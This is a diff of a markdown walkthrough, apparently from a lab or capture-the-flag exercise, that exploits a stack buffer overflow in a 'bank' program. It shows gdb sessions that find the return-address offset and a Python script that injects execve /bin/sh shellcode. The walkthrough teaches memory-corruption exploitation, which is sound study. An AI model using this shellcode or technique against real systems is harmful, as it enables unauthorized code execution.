@@ -184,7 +184,7 @@ $ python3 -c "print('1 ' + 'A'*1012)"
 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
 ```
 
-According to [GeeksforGeeks][2], `scanf` "is used to read the input until it encounters a whitespace, newline or End Of File(EOF)." When the `bank` program receives the payload of `1 AAAAAA...`, `scanf` scans the "1" and stops at the space. Then at the next `scanf` call, the function scans the string of "A"s.
+According to [GeeksforGeeks][2], `scanf` "is used to read the input until it encounters a whitespace, newline or End Of File (EOF)." When the `bank` program receives the payload of `1 AAAAAA...`, `scanf` scans the "1" and stops at the space. Then at the next `scanf` call, the function scans the string of "A"s.
 
 Send the payload to the program:
 ```
@@ -371,14 +371,6 @@ Now that `scanf` has completed, the program returned back to the `captcha` funct
 ```
 
 Notice that these instructions match with the `captcha` function in [bank.c](bank.c):
-```
-Assembly                                        bank.c
-==========================                      ==========================
-0x8049237:	call   0x8049090 <strncmp@plt>      strncmp(userCaptcha,(char *)&b3sT,8);
-0x8049241:	jne    0x804925c                    if (result != 0)
-0x804924d:	call   0x8049050 <puts@plt>         puts("Correct!\n");
-0x8049266:	call   0x8049050 <puts@plt>         puts("Incorrect!\n");
-```
 | Assembly               | bank.c  |
 | :----------------------------- | :------- |
 | `0x8049237:	call   0x8049090 <strncmp@plt>` | `strncmp(userCaptcha,(char *)&b3sT,8);`
@@ -404,17 +396,128 @@ pop ecx         # pop top of the stack and store it in $ecx
 jmp ecx         # jump to $ecx
 ```
 
-Verify the offset that the $eip is written to. Modify the payload so that the last four bytes are "BBBB". Then run the payload with gdb:
+Continue the program until it hits the `0x8049276` breakpoint. Then step instruction with `stepi` (`si` for short):
 ```
-$ python3 -c "print('1 ' + 'A'*1008 + 'BBBB')" > payload
-$ gdb bank
+(gdb) c
+Continuing.
+Incorrect!
+
+=> 0x8049276:	leave  
+0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
+0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
+0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141
+
+Breakpoint 2, 0x08049276 in ?? ()
+(gdb) si
+=> 0x8049277:	ret    
+0xffffdd6c:	0x0804928f	0xf7fb0000	0x00000000	0xffffdda8
+0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
+0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
+0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
+0x08049277 in ?? ()
+(gdb) 
 ```
 
-### Exploit Version 1
+At this point the `ret` function is about to pop the top of the stack (`0x0804928f`) and return to that address. Step again to see this:
+```
+(gdb) si
+=> 0x804928f:	test   eax,eax
+0xffffdd70:	0xf7fb0000	0x00000000	0xffffdda8	0x08049489
+0xffffdd80:	0x0804a137	0x0804c000	0xffffdda8	0x080494b1
+0xffffdd90:	0x00000001	0xffffde54	0xffffde5c	0x00000001
+0xffffdda0:	0xffffddc0	0x00000000	0x00000000	0xf7df0e81
+0x0804928f in ?? ()
+```
+
+The program returned to the function that called `captcha`, which is the `withdraw` function in this case. Step a few more instructions to get the `ret`:
+```
+(gdb) si
+=> 0x8049306:	ret    
+0xffffdd04:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdd14:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdd24:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdd34:	0x41414141	0x41414141	0x41414141	0x41414141
+0x08049306 in ?? ()
+(gdb) 
+```
+
+The program is about to pop the top of the stack and return to that address. However, the stack is filled with the payload of "A"s. When the program returns to address `0x41414141`, it segfaults:
+```
+(gdb) si
+=> 0x41414141:	Error while running hook_stop:
+Cannot access memory at address 0x41414141
+0x41414141 in ?? ()
+(gdb) si
+
+Program received signal SIGSEGV, Segmentation fault.
+=> 0x41414141:	Error while running hook_stop:
+Cannot access memory at address 0x41414141
+0x41414141 in ?? ()
+```
+
+But can the `captcha` function's return instruction be controlled, which is the return at `0x8049277:ret`? Experiment by adding a few more bytes to the payload:
+```
+$ python3 -c "print('1 ' + 'A'*1012 + 'BBBB' + 'CCCC')" > payload
+```
+
+Run the program again with this new payload. Continue until breakpoint at `0x08049276`:
+```
+(gdb) run < payload
+...
+(gdb) c
+Continuing.
+Incorrect!
+
+=> 0x8049276:	leave  
+0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
+0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
+0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd990:	0x41414141	0x41414141	0x41414141	0x41414141
+
+Breakpoint 2, 0x08049276 in ?? ()
+(gdb) si
+=> 0x8049277:	ret    
+0xffffdd6c:	0x43434343	0xf7fb0000	0x00000000	0xffffdda8
+0xffffdd7c:	0x08049489	0x0804a137	0x0804c000	0xffffdda8
+0xffffdd8c:	0x080494b1	0x00000001	0xffffde54	0xffffde5c
+0xffffdd9c:	0x00000001	0xffffddc0	0x00000000	0x00000000
+0x08049277 in ?? ()
+```
+
+At `0x8049277`, the `ret` instruction is about to pop and return to address `0x43434343`, which is "CCCC" in hex. "CCCC" can be changed to any address desired. Therefore, the payload successfully manipulated the instruction pointer at the `0x8049277:ret` instruction!
+
+### Exploit Version 1: Execute a Shell
 
 At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 
 
-First find a good address to return to. Open up gdb. 
+First find a good address to return to. Open up gdb. Run the program again without a payload (use `set args` to clear any arguments). Run until breakpoint at `0x08049276` then take a look at the stack pointer:
+```
+(gdb) set args
+(gdb) run
+...
+Breakpoint 2, 0x08049276 in ?? ()
+(gdb) si
+=> 0x8049277:	ret    
+0xffffdd6c:	0x0804928f	0xf7fb0000
+...
+(gdb) x $esp
+0xffffdd6c:	0x0804928f
+```
+
+The stack pointer `esp` is at `0xffffdd6c`. And the stack looks like this:
+```
+            return address
+            v
+0xffffdd6c:	0x0804928f	0xf7fb0000
+^                       ^
+$esp address            payload starts here = $esp + 4
+```
+
+The payload starts at `esp` + 4. Use this as the return address for the payload:
+```
+eip = 0xffffdd6c + 4
+```
 
 Use the shell code LiveOverflow suggested by [Shell Storm: Linux x86 execve("/bin/sh")][5]:
 ```
@@ -455,18 +558,61 @@ int main()
 }
 ```
 
-Create the payload with a [python](exploit1.py) script:
+Create the payload with a [python](exploit1.py) script. Note that `eip` is set to the return address of `0xffffdd6c + 4` as discovered earlier.
 ```python
 #!/usr/bin/python3
 import struct
 
-eip = struct.pack("I", 0xdeadbeef)
+eip = struct.pack("I", 0xffffdd6c + 4)
 shellcode =  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\1bx31\xc0\x40\xcd\x80'
-payload = b'A' * 1008 + eip + shellcode
+payload = b'1 ' + b'A' * 1012 + b'BBBB' + eip + shellcode
 
 with open("payload", "wb") as handle:
     handle.write(payload)
 ```
+
+Run this script and run the payload in gdb. Pause at breakpoint `0x08049276`:
+```
+(gdb) run < payload
+...
+Breakpoint 2, 0x08049276 in ?? ()
+(gdb) si
+=> 0x8049277:	ret    
+0xffffdd6c:	0xffffdd70	0x6850c031
+```
+
+This is good. The program is about to return to `0xffffdd70` (which is `0xffffdd6c + 4`) just as intended. However, continue the program and it segfaults. 
+
+Examine the stack and make sure everything else is in place. The return address is definitely correct:
+```
+=> 0x8049277:	ret
+            return address is correct
+            v
+0xffffdd6c:	0xffffdd70  0x6850c031
+```
+
+What about the payload? Compare the intended payload with the stack contents. At this point its easier to read the stack in byte sizes due to [endianness](https://en.wikipedia.org/wiki/Endianness). Use this command: `x/48bx $esp+4`. Here is the output with comparison to the payload:
+```
+(gdb) x/48bx $esp+4
+intended payload address
+v
+0xffffdd70:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68  # stack
+            \x31    \xc0    \x50    \x68    \x2f    \x2f    \x73    \x68  # payload part 1
+
+0xffffdd78:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x89  # stack
+            \x68    \x2f    \x62    \x69    \x6e    \x89    \xe3    \x89  # payload part 2
+
+0xffffdd80:	0xc1	0x89	0xc2	0xb0	0x00	0xc0	0x04	0x08  # stack
+            \xc1    \x89    \xc2    \xb0    \x0b    \xcd    \x80    \1    # payload part 3
+                                            ^ starting from this byte, the payload does not match
+0xffffdd88:	0xa8	0xdd	0xff	0xff	0xb1	0x94	0x04	0x08  # stack
+            b       x       3       1       \xc0    \x40    \xcd    \x80  # payload part 4
+...
+```
+
+Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). Is it possible to get around this? Yes.
+
+
 
 # TODO
 TODO: remove all /zionperez/ folder names
